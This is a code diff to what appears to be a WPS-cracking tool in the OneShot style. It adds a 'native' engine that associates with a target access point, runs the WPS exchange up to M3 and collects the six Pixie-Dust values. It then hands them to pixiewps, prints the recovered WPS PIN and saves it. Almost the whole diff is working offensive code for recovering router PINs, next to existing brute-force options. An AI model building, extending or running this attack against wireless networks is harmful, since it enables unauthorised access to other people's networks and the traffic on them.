@@ -563,21 +563,25 @@ class Companion:
 
     MAX_WPS_FAIL_RETRIES = 5
 
-    def __init__(self, interface, save_result=False, print_debug=False):
+    def __init__(self, interface, save_result=False, print_debug=False, engine='wpa_supplicant'):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        self.engine = engine
 
         self.tempdir = tempfile.mkdtemp()
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
-            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
-            self.tempconf = temp.name
-        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
-        self.__init_wpa_supplicant()
+        # The native engine talks to the kernel directly, so it needs no
+        # wpa_supplicant process or control socket.
+        if engine != 'native':
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
+                temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
+                self.tempconf = temp.name
+            self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
+            self.__init_wpa_supplicant()
 
-        self.res_socket_file = os.path.join(self.tempdir, 'retsock')
-        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-        self.retsock.bind(self.res_socket_file)
+            self.res_socket_file = os.path.join(self.tempdir, 'retsock')
+            self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+            self.retsock.bind(self.res_socket_file)
 
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
@@ -893,6 +897,8 @@ class Companion:
                 print("\nAborting…")
                 self.__savePin(bssid, pin)
                 return False
+        elif pixiemode and self.engine == 'native':
+            self.__collect_pixie_native(bssid, ssid)
         else:
             self.__wps_connection(bssid, pin, pixiemode)
 
@@ -912,6 +918,12 @@ class Companion:
             if self.pixie_creds.got_all():
                 pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pixiedust_pin:
+                    if self.engine == 'native':
+                        # Phase 1: native engine collected the data and pixiewps
+                        # cracked the PIN; report it (full native connect = Phase 2).
+                        print(f"[+] WPS PIN recovered (Pixie-Dust): '{pixiedust_pin}'")
+                        self.__savePin(bssid, pixiedust_pin)
+                        return True
                     return self.__wps_connection(bssid, pixiedust_pin, pixiemode=False)
                 return False
             else:
@@ -922,6 +934,29 @@ class Companion:
                 # Saving Pixiewps calculated PIN if can't connect
                 self.__savePin(bssid, pin)
             return False
+
+    def __collect_pixie_native(self, bssid, ssid):
+        """Collect the six Pixie-Dust values via the native engine (no wpa_supplicant)."""
+        try:
+            import wps_connect
+        except ImportError:
+            print('[!] Native engine unavailable (wps_connect.py missing)')
+            return
+        print('[*] Native engine: associating and running WPS exchange to M3…')
+        try:
+            data = wps_connect.WpsConnection(self.interface, bssid, ssid or '').pixie_dust()
+        except Exception as e:
+            print('[!] Native WPS exchange failed: {}'.format(e))
+            return
+        if not data:
+            print('[!] Native engine did not collect enough WPS data')
+            return
+        self.pixie_creds.pke = data['pke']
+        self.pixie_creds.pkr = data['pkr']
+        self.pixie_creds.e_hash1 = data['e_hash1']
+        self.pixie_creds.e_hash2 = data['e_hash2']
+        self.pixie_creds.authkey = data['authkey']
+        self.pixie_creds.e_nonce = data['e_nonce']
 
     def __first_half_bruteforce(self, bssid, f_half, delay=None):
         """
@@ -1405,6 +1440,14 @@ if __name__ == '__main__':
         help='Device serial number — enables the Belkin and Orange PIN algorithms'
         )
     parser.add_argument(
+        '--engine',
+        type=str,
+        choices=['wpa_supplicant', 'native'],
+        default='wpa_supplicant',
+        help="WPS engine: 'wpa_supplicant' (default) or 'native' (built-in "
+             "pure-Python nl80211+EAPOL engine; Pixie-Dust only, needs root)"
+        )
+    parser.add_argument(
         '--mtk-wifi',
         action='store_true',
         help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
@@ -1423,6 +1466,9 @@ if __name__ == '__main__':
         die("The program requires Python 3.6 and above")
     if os.getuid() != 0:
         die("Run it as root")
+
+    if args.engine == 'native' and not args.pixie_dust:
+        die("--engine native currently supports only the Pixie-Dust attack (-K)")
 
     if args.mtk_wifi:
         wmtWifi_device = Path("/dev/wmtWifi")
@@ -1457,7 +1503,8 @@ if __name__ == '__main__':
                         args.bssid = network_info[0]
                         args.ssid = network_info[1] if len(network_info) > 1 else None
                 if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    companion = Companion(args.interface, args.write,
+                                          print_debug=args.verbose, engine=args.engine)
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay, loop=args.loop)
                     else:
